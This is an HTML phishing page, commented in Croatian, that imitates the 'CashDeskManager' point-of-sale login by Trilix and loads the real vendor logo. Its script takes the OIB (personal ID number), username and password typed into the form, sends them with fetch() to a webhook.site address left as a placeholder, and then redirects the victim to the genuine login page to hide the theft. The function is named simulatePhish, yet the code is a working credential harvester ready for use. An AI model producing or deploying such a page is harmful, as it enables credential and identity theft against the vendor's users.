<!DOCTYPE html>
<html lang="hr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CashDeskManager - Login</title>
    <style>
        /* Osnovni stilovi da izgleda kao original */
        body { font-family: Arial, sans-serif; background-color: #f4f4f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-container { background-color: #fff; padding: 2rem; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); text-align: center; width: 300px; }
        .login-container img { margin-bottom: 1rem; }
        .login-container input[type="text"], .login-container input[type="password"] { width: 100%; padding: 0.5rem; margin-bottom: 1rem; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
        .login-container button { width: 100%; padding: 0.7rem; background-color: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }
        .login-container button:hover { background-color: #0056b3; }
        .footer { font-size: 0.8em; color: #888; margin-top: 1rem; }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://dsds.trilix.hr/CashDeskManager/resources/themes/xpos/xpos-logo.png" alt="Trilix Logo" />
        <form id="loginForm">
            <div class="form-group">
                <input type="text" id="oib" name="oib" placeholder="OIB:" required>
            </div>
            <div class="form-group">
                <input type="text" id="user" name="user" placeholder="Korisničko ime:" required>
            </div>
            <div class="form-group">
                <input type="password" id="pass" name="pass" placeholder="Zaporka:" required>
            </div>
            <div class="form-group">
                <label><input type="checkbox" name="remember"> Zapamti me</label>
            </div>
            <button type="button" id="loginBtn">Login</button>
        </form>
        <div class="footer">
            <p>3.8.0 (b4183b1)<br>powered by Trilix</p>
        </div>
    </div>

    <script>
        function downloadFile(filename, textData) {
            const blob = new Blob([textData], { type: "text/plain" });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = filename;
            a.style.display = 'none';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
        }

        function simulatePhish() {
            const oib = document.getElementById('oib').value || '<prazno>';
            const user = document.getElementById('user').value || '<prazno>';
            const pass = document.getElementById('pass').value || '<prazno>';

            // Slanje podataka na webhook
            fetch('https://webhook.site/TVOJ_WEBHOOK_LINK', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ oib: oib, username: user, password: pass })
            }).then(() => {
                // Preusmeravanje na pravu stranicu nakon slanja
                window.location.href = 'https://dsds.trilix.hr/CashDeskManager/login';
            });
        }

        document.getElementById('loginBtn').addEventListener('click', simulatePhish);
    </script>
</body>
</html>
